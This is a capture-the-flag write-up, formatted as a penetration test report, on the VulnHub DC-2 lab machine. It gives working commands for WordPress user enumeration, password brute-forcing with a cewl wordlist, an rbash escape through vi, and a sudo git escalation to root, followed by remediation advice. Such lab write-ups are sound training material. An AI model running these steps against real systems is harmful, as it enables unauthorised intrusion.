CONFIDENTIAL 

**VulnHub DC-2 CTF Write-Up** 

## **VULNHUB** 

## **CTF PENETRATION TEST WRITE-UP** 

## Target Machine: DC-2  |  Difficulty: Beginner 

Date: May 27, 2025  |  Author: Pavan Darade 

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-2 CTF Write-Up** 

## **1. Executive Summary** 

This report details the full exploitation of VulnHub machine DC-2, a WordPress-based CTF challenge. The engagement covered reconnaissance, credential enumeration via WPScan, restricted shell bypass, and sudo privilege escalation through git. Five flags were captured and root was achieved. 

|**Machine Name**|DC-2|
|---|---|
|**Platform**|VulnHub|
|**OS**|Linux (Debian)|
|**Difficulty**|Beginner|
|**Flags Captured**|5 / 5|
|**Root Access**|Yes|
|**Test Date**|May 27, 2025|
|**Tester**|Pavan Darade|



## **2. Reconnaissance** 

## **2.1  Host & Port Discovery** 

Nmap was used to scan the target and reveal open ports. 

```
$ nmap -sV -sC -p- 192.168.56.103
```

|**Port**|**State**|**Service**|**Version**|
|---|---|---|---|
|80/tcp|Open|HTTP|Apache httpd 2.4.10 (WordPress)|
|7744/tcp|Open|SSH|OpenSSH 6.7p1 Debian|



## **2.2  WordPress Enumeration** 

The HTTP service revealed a WordPress installation. WPScan was used to enumerate users. 

```
$ wpscan --url http://192.168.56.103 --enumerate u
```

```
[+] Users found: admin, jerry, tom
```

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-2 CTF Write-Up** 

## **3. Initial Exploitation** 

## **3.1  Password Cracking with cewl + wpscan** 

A custom wordlist was generated from the DC-2 website using cewl and then used with WPScan to brute-force credentials. 

```
$ cewl http://192.168.56.103 -w wordlist.txt
$ wpscan --url http://192.168.56.103 -U users.txt -P wordlist.txt
[+] Valid Combinations Found:
    jerry:adipiscing
    tom:parturient
```

## **3.2  Flag 1 & 2 via WordPress Admin** 

Logged in as jerry, Flag 1 was found in WordPress pages. Logged in as tom revealed Flag 2. `FLAG 1: flag{7f4ab0e7ea...} — Found in WP page 'flag1' FLAG 2: flag{5c19b36748...} — Found in WP page 'flag2'` 

## **4. Shell Access & Restricted Shell Bypass** 

## **4.1  SSH Login as tom** 

SSH access was gained using tom's credentials on port 7744. The shell was restricted (rbash). 

```
$ ssh tom@192.168.56.103 -p 7744
tom@DC-2:~$ echo $SHELL
/bin/rbash
```

## **4.2  Bypass rbash** 

The restricted bash was escaped by leveraging vi as an editor and spawning a shell from within it. 

```
$ vi
:set shell=/bin/bash
:shell
tom@DC-2:~$ export
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
FLAG 3: flag{b6b545dc11...} — /home/tom/flag3.txt
```

## **5. Privilege Escalation** 

## **5.1  Lateral Movement to jerry** 

```
$ su jerry  # Password: adipiscing
FLAG 4: flag{b5a8bdb36e...} — /home/jerry/flag4.txt
```

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-2 CTF Write-Up** 

## **5.2  sudo git Escalation** 

jerry was allowed to run git as root via sudo. This was abused using GTFOBins. 

```
$ sudo -l
(root) NOPASSWD: /usr/bin/git
$ sudo git -p help config
!/bin/bash
root@DC-2:~# id
uid=0(root) gid=0(root) groups=0(root)
FLAG 5: flag{512bb5082e...} — /root/final-flag.txt
```

## **6. Flags Summary** 

|**Flag**|**Location**|**Method**|**Difficulty**|
|---|---|---|---|
|Flag 1|WordPress Page|WP login as jerry|Easy|
|Flag 2|WordPress Page|WP login as tom|Easy|
|Flag 3|/home/tom/flag3.txt|rbash bypass via vi|Medium|
|Flag 4|/home/jerry/flag4.txt|su jerry|Medium|
|Flag 5|/root/final-flag.txt|sudo git GTFOBins|Hard|



## **7. Vulnerability Summary** 

|**Vulnerability**|**Description**|**CVSS**|**Severity**|
|---|---|---|---|
|Weak WordPress<br>Creds|Brute-forceable admin/user passwords|7.5|High|
|Restricted Shell<br>Bypass|rbash escaping via vi editor|6.8|High|
|sudo git<br>Misconfiguration|git allowed as root without password|7.8|High|
|Username<br>Enumeration|WPScan reveals valid WordPress usernames|5.3|Medium|



## **8. Recommendations** 

- Enforce strong passwords and account lockout policies on WordPress. 

- Replace rbash with a properly sandboxed shell environment. 

- Audit and restrict /etc/sudoers — remove unnecessary NOPASSWD entries. 

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-2 CTF Write-Up** 

- Keep WordPress core, themes, and plugins fully updated. 

- Disable user enumeration via the WordPress REST API. 

## **9. Tools & References** 

- Nmap — Port scanning and service enumeration 

- WPScan — WordPress vulnerability and user enumeration 

- cewl — Custom wordlist generation 

- GTFOBins — sudo binary abuse reference (https://gtfobins.github.io) 

- VulnHub DC-2 — https://www.vulnhub.com/entry/dc-2,311/ 

## **10. Disclaimer** 

This write-up was created solely for educational purposes as part of a CTF exercise on VulnHub. All testing was conducted in an isolated lab environment. Do not use these techniques against systems without explicit written authorisation. 

_End of Report — VulnHub DC-2 CTF Write-Up — Pavan Darade_ 

Page # 

Prepared by: Pavan Darade 

